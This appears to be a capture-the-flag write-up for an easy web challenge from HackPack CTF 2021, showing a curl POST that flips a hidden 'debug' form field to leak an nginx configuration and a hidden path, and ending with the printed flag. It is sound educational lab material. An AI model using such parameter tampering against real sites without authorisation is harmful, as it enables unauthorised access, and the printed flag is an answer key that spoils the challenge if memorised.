
# Challenge Name: "N"ot "G"am"I"ng a"N"ymore in "X"mas



![date](https://img.shields.io/badge/date-17.04.2021-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)   
![web category](https://img.shields.io/badge/category-Web-blueviolet.svg)   
![level](https://img.shields.io/badge/level-Easy-blue.svg)
![score](https://img.shields.io/badge/score-50-blue.svg)

## Description

Can you login as admin? http://no-gaming-anymore-in-xmas.ctf2021.hackpack.club

## Detailed solution

Starting by opening the challenge link http://no-gaming-anymore-in-xmas.ctf2021.hackpack.club

It's a login page 

![image](https://user-images.githubusercontent.com/72421091/115269285-ad1d2980-a12a-11eb-8abc-2628af3ed9ce.png)

Let's see the page source view-source:https://no-gaming-anymore-in-xmas.ctf2021.hackpack.club/ 

```html 
<!DOCTYPE html>
<html lang="en">
<head>
	<title>Login V1</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>	

	<span>Admin Login</span>
	<div>
		<input placeholder="Password"></input>
	</div>

	<form action="/" method="post">
		<button type="submit" value="Send Email" >Login</button>
		<input type="hidden" name="debug" value="0">
	</form> 
	
</body>
</html>
```  

We have a POST request with a hidden data ``` debug=0```  

Let's change it to 1 and send the POST request 

```bash 
curl 'https://no-gaming-anymore-in-xmas.ctf2021.hackpack.club/' \
  -H 'authority: no-gaming-anymore-in-xmas.ctf2021.hackpack.club' \
  -H 'cache-control: max-age=0' \
  -H 'sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"' \
  -H 'sec-ch-ua-mobile: ?0' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'origin: https://no-gaming-anymore-in-xmas.ctf2021.hackpack.club' \
  -H 'content-type: application/x-www-form-urlencoded' \
  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-user: ?1' \
  -H 'sec-fetch-dest: document' \
  -H 'referer: https://no-gaming-anymore-in-xmas.ctf2021.hackpack.club/' \
  -H 'accept-language: en-US,en;q=0.9,ar;q=0.8,fr;q=0.7' \
  -H 'cookie: _817ab=http://192.168.181.15:11000' \
  --data-raw 'debug=1' \
  --compressed
```  
Output : 
```
Let me check again my nginx conf:
server {
listen 80;
server_name localhost;

root /etc/nginx;
index index.html;

location /maybehereimportantstuff {
try_files $uri $uri/ =404;
}
}
```  
Let's check /maybehereimportantstuff 

https://no-gaming-anymore-in-xmas.ctf2021.hackpack.club/maybehereimportantstuff

## Flag

```
flag{ng1nx_m1sconf1g_c4n_b3_h4rmful}
```
